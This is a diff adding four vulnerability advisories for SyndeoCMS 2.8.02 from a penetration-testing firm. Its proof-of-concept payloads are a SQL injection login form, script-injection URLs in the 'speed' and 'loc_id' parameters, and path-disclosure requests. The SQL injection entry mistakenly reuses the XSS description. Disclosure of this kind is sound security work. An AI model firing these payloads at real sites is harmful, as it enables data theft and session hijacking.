@@ -1,0 +1,95 @@
+Vulnerability ID: HTB22901
+Reference: http://www.htbridge.ch/advisory/sql_injection_in_syndeocms.html
+Product: SyndeoCMS
+Vendor: http://www.syndeocms.org/ ( http://www.syndeocms.org/ ) 
+Vulnerable Version: 2.8.02
+Vendor Notification: 10 March 2011 
+Vulnerability Type: SQL injection
+Risk level: High 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "index.php" script to properly sanitize user-supplied input in "user_username" variable.
+User can execute arbitrary JavaScript code within the vulnerable application.
+Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+The following PoC is available:
+
+[html]
+<form action="http://[host]/index.php?section=4&page=3" method="post" name="main" >
+<input type="hidden" name="user_username" value="1'SQL_CODE_HERE" />
+<input type="hidden" name="user_password" value="1" />
+<input type="hidden" name="option" value="userlogin" />
+<input type="submit" value="submit" name="submit" />
+</form>
+[/html]
+
+Vulnerability ID: HTB22902
+Reference: http://www.htbridge.ch/advisory/xss_in_syndeocms.html
+Product: SyndeoCMS
+Vendor: http://www.syndeocms.org/ ( http://www.syndeocms.org/ ) 
+Vulnerable Version: 2.8.02
+Vendor Notification: 10 March 2011 
+Vulnerability Type: XSS (Cross Site Scripting)
+Risk level: Medium 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/starnet/addons/scroll_page" script to properly sanitize user-supplied input in "speed" variable.
+User can execute arbitrary JavaScript code within the vulnerable application.
+Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+The following PoC is available:
+
+[code]
+http://[host]/starnet/addons/scroll_page.php?speed=--%3E%3C/script%3E%3C
+/head%3E%3Cscript%3Ealert%28%22XSS%22%29;%3C/script%3E
+[/code]
+
+
+Vulnerability ID: HTB22900
+Reference: http://www.htbridge.ch/advisory/multiple_xss_vulnerabilities_in_syndeocm
+s.html
+Product: SyndeoCMS
+Vendor: http://www.syndeocms.org/ ( http://www.syndeocms.org/ ) 
+Vulnerable Version: 2.8.02
+Vendor Notification: 10 March 2011 
+Vulnerability Type: XSS (Cross Site Scripting)
+Risk level: Medium 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/starnet/addons/page_slideshow.php" & "/starnet/addons/tv.php" scripts to properly sanitize user-supplied input in "loc_id" variable.
+User can execute arbitrary JavaScript code within the vulnerable application.
+Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+The following PoC is available:
+
+[code]
+http://[host]/starnet/addons/page_slideshow.php?loc_id=1"></iframe><scri
+pt>alert("XSS");</script>
+http://[host]/starnet/addons/tv.php?loc_id=1"></iframe><script>alert("XS
+S");</script>
+[/code]
+
+
+Vulnerability ID: HTB22899
+Reference: http://www.htbridge.ch/advisory/path_disclosure_in_syndeocms.html
+Product: SyndeoCMS
+Vendor: http://www.syndeocms.org/ ( http://www.syndeocms.org/ ) 
+Vulnerable Version: 2.8.02
+Vendor Notification: 10 March 2011 
+Vulnerability Type: Path disclosure
+Risk level: Low 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/starnet/addons/checker.php" & "/starnet/addons/logging.php" scripts, it's possible to generate an error that will reveal the full path of the script.
+A remote user can determine the full path to the web root directory and other potentially sensitive information.
+
+The following PoC is available:
+
+[code]
+http://[host]/starnet/addons/checker.php
+http://[host]/starnet/addons/logging.php
+[/code]
